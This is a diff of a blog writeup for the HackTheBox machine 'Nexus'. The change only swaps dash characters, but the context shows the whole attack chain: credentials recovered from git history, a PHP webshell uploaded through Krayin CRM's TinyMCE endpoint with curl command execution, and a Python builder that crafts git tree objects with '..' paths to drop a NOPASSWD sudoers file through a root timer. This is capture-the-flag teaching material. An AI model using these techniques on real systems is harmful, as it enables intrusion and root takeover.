@@ -1,6 +1,6 @@
 ---
 slug: "htb-nexus"
-title: "Nexus — HackTheBox Machine Writeup"
+title: "Nexus - HackTheBox Machine Writeup"
 date: "2026-08-03"
 platform: "HackTheBox"
 type: "Machine"
@@ -55,7 +55,7 @@ import { TerminalReplay } from "@/components/cyber/TerminalReplay";
 Nexus is a masterclass in "deleted ≠ gone" and "trusting input shape". The first credential comes from git history, not from any server. The second comes from a `.env` read through an RCE that the first credential unlocked. And root comes from abusing a root-run sync script with a git tree object that no normal `git add` would ever let you create. Every stage reuses something that should have been rotated, sanitized, or anchored.
 
 <Callout type="info">
-Beginner note: this box rewards keeping a strict credential ledger. Three different passwords appear (Gitea history → Krayin login, production .env → SSH, Gitea web → template repo) and the first two are reused across services. Write every secret down as you find it. We explore systematic post-exploitation credential harvesting in our reference guide: **[Linux Privilege Escalation — Enumeration](/cheatsheet/linux/privesc-enumeration)**.
+Beginner note: this box rewards keeping a strict credential ledger. Three different passwords appear (Gitea history → Krayin login, production .env → SSH, Gitea web → template repo) and the first two are reused across services. Write every secret down as you find it. We explore systematic post-exploitation credential harvesting in our reference guide: **[Linux Privilege Escalation - Enumeration](/cheatsheet/linux/privesc-enumeration)**.
 </Callout>
 
 ## Enumeration & Web Application Recon
@@ -71,7 +71,7 @@ PORT   STATE SERVICE
 $ nmap -p 22,80 -sCV 10.129.234.54
 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
 80/tcp open  http    nginx 1.24.0 (Ubuntu)
-|_http-title: Nexus Energy Authority — Powering the Nation's Future
+|_http-title: Nexus Energy Authority - Powering the Nation's Future
 ```
 
 The root domain redirects to `http://nexus.htb/`, so virtual hosts are in play. Adding all three hostnames up front:
@@ -82,7 +82,7 @@ echo "10.129.234.54 nexus.htb git.nexus.htb billing.nexus.htb" | sudo tee -a /et
 
 ### Email harvesting
 
-The corporate homepage leaks two contact emails in its HTML — one of which will be a username later:
+The corporate homepage leaks two contact emails in its HTML - one of which will be a username later:
 
 ```text
 careers@nexus.htb
@@ -102,16 +102,16 @@ Two interesting hits:
 
 | Subdomain | Behavior |
 |-----------|----------|
-| `git.nexus.htb`     | HTTP 200 — Gitea instance |
-| `billing.nexus.htb` | HTTP 302 → `/admin/login` — Krayin CRM |
+| `git.nexus.htb`     | HTTP 200 - Gitea instance |
+| `billing.nexus.htb` | HTTP 302 → `/admin/login` - Krayin CRM |
 
 <Callout type="warning">
 `billing.nexus.htb` 302s to its login page, so a naive `-fc 302` filter hides it from the results. If a vhost 302s on purpose, enumerate with `-mc all` or check the redirect target before filtering it out.
 </Callout>
 
-## Gitea — Credential Leak from Git History
+## Gitea - Credential Leak from Git History
 
-`git.nexus.htb` is Gitea with two visible users, `jones` and `admin`. The `admin` user owns a public repository named `krayin-docker-setup` — the deployment scaffolding for the CRM on `billing.nexus.htb`.
+`git.nexus.htb` is Gitea with two visible users, `jones` and `admin`. The `admin` user owns a public repository named `krayin-docker-setup` - the deployment scaffolding for the CRM on `billing.nexus.htb`.
 
 The current `.env` in the repo shows a scrubbed database password:
 
@@ -135,9 +135,9 @@ $ git log -p -- .env | grep -A2 -B2 DB_PASSWORD
 This is the "credential leak from git history" pattern: secrets that were removed from a *file* still live in the *objects* of every commit that ever contained them. We detailed similar git metadata & repository history harvesting vectors in our writeup for **[HackTheBox Busqueda](/writeups/htb-busqueda)**. `git log -p -- <file>` is the fastest way to diff a file across its whole life.
 </Callout>
 
-The `APP_URL` in the same `.env` points at `http://billing.nexus.htb` — confirming this password belongs to the CRM. The password `N27xh!!2ucY04` is also the login for `j.matthew@nexus.htb`.
+The `APP_URL` in the same `.env` points at `http://billing.nexus.htb` - confirming this password belongs to the CRM. The password `N27xh!!2ucY04` is also the login for `j.matthew@nexus.htb`.
 
-## Foothold — Krayin CRM RCE (TinyMCE File Upload)
+## Foothold - Krayin CRM RCE (TinyMCE File Upload)
 
 ### Logging in
 
@@ -158,7 +158,7 @@ curl -s -b cookies.txt -c cookies.txt -X POST http://billing.nexus.htb/admin/log
   -d "email=j.matthew@nexus.htb" -d "password=N27xh!!2ucY04"
 ```
 
-Result: `302 → /admin/dashboard` and a `krayin_crm_session` cookie — we are in as the CRM administrator.
+Result: `302 → /admin/dashboard` and a `krayin_crm_session` cookie - we are in as the CRM administrator.
 
 ### The upload endpoint
 
@@ -199,9 +199,9 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 Arbitrary command execution as `www-data`. From here the web root's environment file is the natural next stop.
 
-## Lateral Movement — www-data → jones
+## Lateral Movement - www-data → jones
 
-The Krayin deployment lives at `/var/www/krayin`, and its production `.env` holds a *different* database password than the one in the Gitea repo — this one was never scrubbed:
+The Krayin deployment lives at `/var/www/krayin`, and its production `.env` holds a *different* database password than the one in the Gitea repo - this one was never scrubbed:
 
 ```bash
 curl "http://billing.nexus.htb/storage/tinymce/4d8a0b28d0e025abb7798b602a675a36.php?cmd=cat%20/var/www/krayin/.env"
@@ -217,7 +217,7 @@ DB_PASSWORD=y27xb3ha!!74GbR
 ```
 
 <Callout type="tip">
-The `.env` also reveals `APP_DEBUG=true` — Laravel's debug toolbar is enabled and leaks stack traces, queries, and paths on every page. A separate finding, but it underscores how much this box leaks by default.
+The `.env` also reveals `APP_DEBUG=true` - Laravel's debug toolbar is enabled and leaks stack traces, queries, and paths on every page. A separate finding, but it underscores how much this box leaks by default.
 </Callout>
 
 Testing that password against SSH: the box reuses it for the local `jones` account, who happens to own the Gitea account of the same name.
@@ -235,7 +235,7 @@ f4ab38...03079dc74
 
 <SpoilerFlag flag="f4ab384ca8f95f2ddf5782703079dc74" label="user.txt" />
 
-## Privilege Escalation — Root Timer + Git Tree-Object Traversal
+## Privilege Escalation - Root Timer + Git Tree-Object Traversal
 
 ### The root-run template sync
 
@@ -273,8 +273,8 @@ for mode, objhash, filepath in entries:
 
 For every template repo, it runs `git ls-tree -r HEAD` and writes each blob to `os.path.join(stage_path, filepath)`. Three failures compound:
 
-1. `filepath` comes straight from git output — no sanitization.
-2. `os.path.join` happily resolves `..` — it does not confine the path to `stage_path`.
+1. `filepath` comes straight from git output - no sanitization.
+2. `os.path.join` happily resolves `..` - it does not confine the path to `stage_path`.
 3. `os.makedirs` creates any intermediate directory, including `..` components, so the whole ancestor chain materializes on disk.
 
 <Callout type="warning">
@@ -285,10 +285,10 @@ So the only question is: **how do we get a `..` path into a git tree?**
 
 ### The git tree-object trick
 
-Git 2.35+ refuses to *index* filenames containing `..` — `git add` and even manual index edits reject them. But the **tree objects** stored in `.git/objects` are just raw binary structures: `"<mode> <name>\0<20-byte SHA>"` entries. Nothing validates the *name* when you write the object by hand. A tree can contain an entry whose name is literally `..`, and `git ls-tree -r` will flatten it into a path like `../../../../../../etc/sudoers.d/pwn`.
+Git 2.35+ refuses to *index* filenames containing `..` - `git add` and even manual index edits reject them. But the **tree objects** stored in `.git/objects` are just raw binary structures: `"<mode> <name>\0<20-byte SHA>"` entries. Nothing validates the *name* when you write the object by hand. A tree can contain an entry whose name is literally `..`, and `git ls-tree -r` will flatten it into a path like `../../../../../../etc/sudoers.d/pwn`.
 
 <Callout type="tip">
-The check is in the index-write path, not in the object format. Hand-rolled tree objects bypass every `git add` safeguard because they never go through the index. This is the same class of attack as crafting zip entries with `../` paths — but for git's object database. For more Linux privilege escalation techniques involving custom binary crafts and root task hijacking, see **[Linux Privilege Escalation — Exploitation](/cheatsheet/linux/privesc-exploitation)**.
+The check is in the index-write path, not in the object format. Hand-rolled tree objects bypass every `git add` safeguard because they never go through the index. This is the same class of attack as crafting zip entries with `../` paths - but for git's object database. For more Linux privilege escalation techniques involving custom binary crafts and root task hijacking, see **[Linux Privilege Escalation - Exploitation](/cheatsheet/linux/privesc-exploitation)**.
 </Callout>
 
 ### Building the malicious template repo
@@ -305,7 +305,7 @@ The payload the tree will carry:
 jones ALL=(ALL) NOPASSWD: ALL
 ```
 
-The builder — pure Python with `hashlib` + `zlib`, no index involved:
+The builder - pure Python with `hashlib` + `zlib`, no index involved:
 
 ```python
 #!/usr/bin/env python3
@@ -355,7 +355,7 @@ print("commit:", commit_sha)
 
 ### Verifying the flattened tree
 
-Git itself confirms the traversal path appears in `ls-tree -r` output — exactly what the root script will parse:
+Git itself confirms the traversal path appears in `ls-tree -r` output - exactly what the root script will parse:
 
 ```text
 $ git ls-tree -r HEAD
@@ -375,7 +375,7 @@ cd pwn-template && python3 build.py && git push -u origin main --force
 ```
 
 <Callout type="info">
-The `--force` is required because the crafted commit is written directly to `refs/heads/main` without a normal working-tree commit — the remote may consider it a non-fast-forward.
+The `--force` is required because the crafted commit is written directly to `refs/heads/main` without a normal working-tree commit - the remote may consider it a non-fast-forward.
 </Callout>
 
 ### Waiting for the timer
@@ -409,8 +409,8 @@ uid=0(root) gid=0(root) groups=0(root)
 
 Two independent confirmations that the timer (not something else) wrote the file:
 
-1. **File provenance** — `/etc/sudoers.d/pwn` appears in the exact 60s window after the push, with root ownership, at the same moment `template-sync.log` records `synced: ../../../../../../etc/sudoers.d/pwn`.
-2. **Content correctness** — `sudo -l` now emits `(ALL) NOPASSWD: ALL` with no password prompt, and `sudo -n id` returns `uid=0(root)`, proving sudo parsed the dropped file (a malformed sudoers entry would cause a sudo error, not silent success).
+1. **File provenance** - `/etc/sudoers.d/pwn` appears in the exact 60s window after the push, with root ownership, at the same moment `template-sync.log` records `synced: ../../../../../../etc/sudoers.d/pwn`.
+2. **Content correctness** - `sudo -l` now emits `(ALL) NOPASSWD: ALL` with no password prompt, and `sudo -n id` returns `uid=0(root)`, proving sudo parsed the dropped file (a malformed sudoers entry would cause a sudo error, not silent success).
 
 ```bash
 # sudo cat /root/root.txt
@@ -421,7 +421,7 @@ Two independent confirmations that the timer (not something else) wrote the file
 
 ## Autosolve
 
-The entire chain — history leak, CRM login, webshell upload, RCE, `.env` harvest, SSH, crafted tree objects, push, and timer wait — fits in one standalone script. The standalone Python script [`htb_nexus_solve.py`](https://github.com/Asbawy/Asbawy.github.io/blob/main/autosolve/htb_nexus_solve.py) runs the entire exploit in five automated stages and reads every credential dynamically off the live target.
+The entire chain - history leak, CRM login, webshell upload, RCE, `.env` harvest, SSH, crafted tree objects, push, and timer wait - fits in one standalone script. The standalone Python script [`htb_nexus_solve.py`](https://github.com/Asbawy/Asbawy.github.io/blob/main/autosolve/htb_nexus_solve.py) runs the entire exploit in five automated stages and reads every credential dynamically off the live target.
 
 <TerminalReplay
   title="htb_nexus_solve.py"
@@ -437,7 +437,7 @@ The entire chain — history leak, CRM login, webshell upload, RCE, `.env` harve
   ]}
   steps={[
     {
-      label: "Step 1/5 — Recover Gitea history password",
+      label: "Step 1/5 - Recover Gitea history password",
       command: "python3 autosolve/htb_nexus_solve.py 10.129.234.54",
       output: [
         { text: ">> TARGET: 10.129.234.54", color: "blue" },
@@ -447,7 +447,7 @@ The entire chain — history leak, CRM login, webshell upload, RCE, `.env` harve
       delayAfter: 800,
     },
     {
-      label: "Step 2/5 — Krayin CRM webshell upload & RCE",
+      label: "Step 2/5 - Krayin CRM webshell upload & RCE",
       output: [
         { text: "[2/5] Krayin CRM login + TinyMCE webshell upload", color: "blue" },
         { text: "  login     j.matthew@nexus.htb : N27xh!!2ucY04", color: "magenta" },
@@ -457,7 +457,7 @@ The entire chain — history leak, CRM login, webshell upload, RCE, `.env` harve
       delayAfter: 800,
     },
     {
-      label: "Step 3/5 — Harvest jones password from production .env",
+      label: "Step 3/5 - Harvest jones password from production .env",
       output: [
         { text: "[3/5] Read /var/www/krayin/.env -> jones password", color: "blue" },
         { text: "  password  jones : y27xb3ha!!74GbR", color: "green" },
@@ -465,7 +465,7 @@ The entire chain — history leak, CRM login, webshell upload, RCE, `.env` harve
       delayAfter: 800,
     },
     {
-      label: "Step 4/5 — SSH as jones & user flag",
+      label: "Step 4/5 - SSH as jones & user flag",
       output: [
         { text: "[4/5] SSH as jones", color: "blue" },
         { text: "  user.txt  f4ab384ca8f95f2ddf5782703079dc74", color: "magenta" },
@@ -473,7 +473,7 @@ The entire chain — history leak, CRM login, webshell upload, RCE, `.env` harve
       delayAfter: 800,
     },
     {
-      label: "Step 5/5 — Push '..' git tree objects & trigger root timer",
+      label: "Step 5/5 - Push '..' git tree objects & trigger root timer",
       output: [
         { text: "[5/5] Craft '..' tree objects -> push template repo -> wait for timer", color: "blue" },
         { text: "  pushed    commit ea62eab9 -> jones/pwn-template (template)", color: "magenta" },
@@ -493,12 +493,12 @@ Run the full solver with `python3 autosolve/htb_nexus_solve.py <TARGET_IP>`. It 
 
 ## References
 
-- [Gitea API — Repository Endpoints](https://docs.gitea.com/development/api-usage)
-- [HackTricks — File Upload Bypass Techniques](https://book.hacktricks.wiki/en/pentesting-web/file-upload.html)
-- [Git Internals — Tree & Blob Object Specification](https://git-scm.com/book/en/v2/Git-Internals-Git-Objects)
-- [GTFOBins — Sudo Security & Misconfigurations](https://gtfobins.github.io/)
+- [Gitea API - Repository Endpoints](https://docs.gitea.com/development/api-usage)
+- [HackTricks - File Upload Bypass Techniques](https://book.hacktricks.wiki/en/pentesting-web/file-upload.html)
+- [Git Internals - Tree & Blob Object Specification](https://git-scm.com/book/en/v2/Git-Internals-Git-Objects)
+- [GTFOBins - Sudo Security & Misconfigurations](https://gtfobins.github.io/)
 - [Source Code Review: Unearthing Critical Flaws in PHP](/logs/php-code-review)
 - [CVE-2021-43798 Grafana Directory Traversal Deep Dive](/logs/cve-2021-43798-grafana-directory-traversal)
-- [Linux Privilege Escalation — Exploitation](/cheatsheet/linux/privesc-exploitation)
-- [Linux Privilege Escalation — Enumeration](/cheatsheet/linux/privesc-enumeration)
+- [Linux Privilege Escalation - Exploitation](/cheatsheet/linux/privesc-exploitation)
+- [Linux Privilege Escalation - Enumeration](/cheatsheet/linux/privesc-enumeration)
 - [HackTheBox Busqueda Writeup](/writeups/htb-busqueda)
